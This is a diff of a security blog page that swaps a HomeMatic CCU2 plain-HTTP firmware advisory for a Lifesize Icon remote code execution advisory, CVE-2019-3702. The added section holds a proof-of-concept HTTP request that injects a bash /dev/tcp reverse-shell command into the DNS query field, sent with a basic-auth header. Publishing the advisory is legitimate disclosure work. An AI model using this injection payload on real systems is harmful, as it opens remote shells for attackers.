@@ -3,16 +3,7 @@
 	
 	<link href="//gmpg.org/xfn/11" rel="profile">
 	<meta http-equiv="content-type" content="text/html; charset=utf-8">
-	<link rel="canonical" href="http://atomic111.github.io/article/homematic-ccu2-firmware-via-plain-http" />
-	<meta name="description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
-	<meta property="og:description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
-	<meta itemprop="image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:title" content="CVE-2018-7298: Downloading Firmware via Plain HTTP in HomeMatic CCU2" />
-	<meta property="og:type" content="article" />
-	<meta property="og:url" content="http://atomic111.github.io/article/homematic-ccu2-firmware-via-plain-http" />
-	<meta property="og:site_name" content="Patrick Münch Blog" />
-	<title>CVE-2018-7298: Downloading Firmware via Plain HTTP in HomeMatic CCU2 &middot; Patrick Münch Blog</title>
+	<title>CVE-2019-3702: Remote Code Execution in Lifesize Icon &middot; Patrick Münch Blog</title>
 	<meta name="mobile-web-app-capable" content="yes">
 	<meta name="HandheldFriendly" content="True" />
 	<meta name="MobileOptimized" content="320" />
@@ -22,9 +13,9 @@
 	<link href="/assets/css/genericons.css" type="text/css" rel="stylesheet" />
 	<link href="/assets/css/syntax.css" type="text/css" rel="stylesheet" />
 	<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fenix:400,400italic">
-	<link rel="apple-touch-icon" href="http://atomic111.github.io/assets/images/logo.jpeg">
-	<link rel="shortcut icon" href="http://atomic111.github.io/assets/images/favicon.ico">
-	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://atomic111.github.io/atom.xml">
+	<link rel="apple-touch-icon" href="http://localhost:4000/assets/images/logo.jpeg">
+	<link rel="shortcut icon" href="http://localhost:4000/assets/images/favicon.ico">
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
 	<script type="text/javascript" src="/assets/js/jquery-2.1.0.min.js"></script>
 	
 	<script type="text/javascript" src="/assets/js/jquery.stellar.min.js"></script>
@@ -70,9 +61,9 @@
 </div>
 
 	<div id="post-info" data-stellar-ratio="0.7">
-		<h1>CVE-2018-7298: Downloading Firmware via Plain HTTP in HomeMatic CCU2</h1>
+		<h1>CVE-2019-3702: Remote Code Execution in Lifesize Icon</h1>
 		
-		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 21 February 2018
+		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 26 March 2019
 	</div>
 	
 	<div id="nav-icon" style="bottom: 30px;" data-stellar-ratio="4">
@@ -81,53 +72,71 @@
 </header>
 <div id="middle">
 	<div id="article">
-		<h1 id="background">Background</h1>
+		<h1 id="overview">Overview</h1>
 
-<p>HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.</p>
+<ul>
+  <li>Vendor: Lifesize</li>
+  <li>Product: Lifesize Icon</li>
+  <li>Version: LS_RM3_3.7.0 (2421)</li>
+  <li>Vulnerability: Remote Code Execution</li>
+</ul>
 
-<p>From the vendor’s website (<a href="http://www.eq-3.de/produkte/homematic/zentralen-und-gateways.html">eQ-3</a>):</p>
+<h1 id="background">Background</h1>
 
-<p>“The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface to the up the system. It can be controlled in the local network as well as via Internet. The Homematic software offers various configuration and application possibilities, so that there are no limits to creativity for installing your individual smart home.”</p>
+<p>LifeSize Icon is a video collaboration platform and consists of various components, e.q. software, video and phone systems.</p>
+
+<p>From the vendor’s website:
+“For more than a decade, Lifesize has been at the forefront of video collaboration delivering high-quality technology designed to bring people together. Our focus is on developing market-leading products that deliver easy-to-use and scalable audio, web and video conferencing. We combine an integrated, best-in-class cloud-based conferencing experience, with award-winning, easy-to-use HD camera systems and HD phones so that you can connect to anyone, anywhere. It’s a meeting experience like no other.”</p>
 
 <h1 id="issue-description">Issue Description</h1>
 
-<p>While analyzing the CCU2 software, it was found that the system’s crontab file contains an entry for invoking the script <code>/usr/local/etc/config/addons/mh/loopupd.sh</code> on a regular basis. This script contains the following code:</p>
+<p>While analyzing the implementation of LifeSize Icon Software, one Remote Code Execution vulnerability has been identified, which can be exploited in order to execute arbitrary commands within the DNS Query address field. This vulnerability can be exploited by authenticated attackers with access to the web interface.</p>
 
-<p>```
-ADDONDIR=/usr/local/etc/config/addons/mh</p>
+<p>The system provides a JSON API, which exposes various methods like the DNS Query function. This function contains a address field that can be exploited with a remote command execution.</p>
 
-<h1 id="altes-schluessel-paket-loeschen">altes Schluessel-Paket loeschen</h1>
-<p>v1=<code>rm $ADDONDIR/vpnkey_ccu2.tar.gz</code>
-v1b=<code>rm $ADDONDIR/newver</code>
-#
-#das Paket des Benutzers herunter laden
-v2=<code>/usr/bin/wget -O $ADDONDIR/newver 'http://www.meine-homematic.de/getverv2.php?id=29294&amp;key=s35m89s3k73e19y7' -q</code>
-#
-```</p>
+<p>The following HTTP request illustrates this approach:</p>
 
-<p>It can be observed that software update packages are downloaded via the HTTP protocol, which does not provide any cryptographic protection of the downloaded contents. An attacker with a privileged network position (which could be obtained via DNS spoofing or other approaches) can exploit this issue in order to provide arbitrary malicious firmware updates to the CCU2. This can result in a full system compromise.</p>
+<p><strong>HTTP-Request</strong></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/rest/request/8cb1a00d113443c6a9a220104bbdea33/Comm_dnsQuery</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">1.1.1.1</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101</span>
+<span class="s">Firefox/63.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">de,en-US;q=0.7,en;q=0.3</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://1.1.1.1/</span>
+<span class="na">X-Client</span><span class="p">:</span> <span class="s">icon-web-client</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">LSBasic c3VwcG9ydDpzdXBwb3J0</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">142</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+<span class="p">{</span><span class="nl">"call"</span><span class="p">:</span><span class="s2">"Comm_dnsQuery"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"A"</span><span class="p">,</span><span class="nl">"domainname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.1.1.2; 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/1.1.1.2/4446; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196"</span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
 
 <h1 id="cve">CVE</h1>
 
-<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7298">CVE-2018-7298</a></p>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3702">CVE-2019-3702</a></p>
 
 <h1 id="cvssv3-base-score">CVSSv3 Base Score</h1>
 
-<p>CVSS Base Score: <strong>4.8</strong></p>
+<p>CVSS Base Score: <strong>8.8</strong></p>
 
-<p>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N</p>
+<p>CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
 
 <h1 id="credit">Credit</h1>
 
-<p>Gregor Kopf of <a href="https://secfault-security.com">Secfault Security GmbH</a></p>
-
 <p>Patrick Muench of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
+
+<p>Joshua Lehr</p>
 
 <h1 id="disclaimer">Disclaimer</h1>
 
 <p>The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.</p>
 
-<p>The contents of this advisory are copyright (c) 2017 Secfault Security GmbH &amp; SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.</p>
+<p>The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.</p>
 
 	</div>
 	
@@ -135,7 +144,7 @@ v2=<code>/usr/bin/wget -O $ADDONDIR/newver 'http://www.meine-homematic.de/getver
 		
 	
 	<script src="https://apis.google.com/js/plusone.js"></script>
-	<div id="g-comments" class="g-comments" data-href="http://atomic111.github.io/article/homematic-ccu2-firmware-via-plain-http" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
+	<div id="g-comments" class="g-comments" data-href="http://localhost:4000/article/lifesize-icon-remote-code-execution" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
 	<script>
 		var width = $('#comments').width() * 0.9;
 		width = Math.round(width);
@@ -156,30 +165,21 @@ v2=<code>/usr/bin/wget -O $ADDONDIR/newver 'http://www.meine-homematic.de/getver
 	</div>
 </div>
 
-	
-		
-		
-		
-		
-		
-		
-	
-
 
 <footer class="clean" style="background-image: url(/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg); height: 75%; min-height: 500px; " data-stellar-background-ratio="0.5" data-stellar-horizontal-offset="50" data-stellar-vertical-offset="50">
 	<div id="nav-icon" style="top: 60px;" data-stellar-ratio="0.8">
 		<a class="scroll" data-speed="500" href="#article"><span class="genericon genericon-collapse"></span></a>
 	</div>
 	<div id="post-info" data-stellar-ratio="0.5" data-stellar-vertical-offset="120">
-		<h3>Featured post</h3>
-		<a href="/article/homematic-ccu2-filewrite">
-			<h1>CVE-2018-7300: Arbitrary File Upload / Remote Code Execution in HomeMatic CCU2</h1>
+		<h3>Read next</h3>
+		<a href="/article/homematic-ccu3-fileread">
+			<h1>CVE-2019-9726: Directory Traversal / Arbitrary File Read in Homematic CCU3</h1>
 			
 				<h2></h2>
 			
 		</a>
 	</div>
-	<p class="copyright">&copy;2018, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
+	<p class="copyright">&copy;2019, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
 </footer>
 <script src="/assets/js/smooth-scroll.js"></script>
 
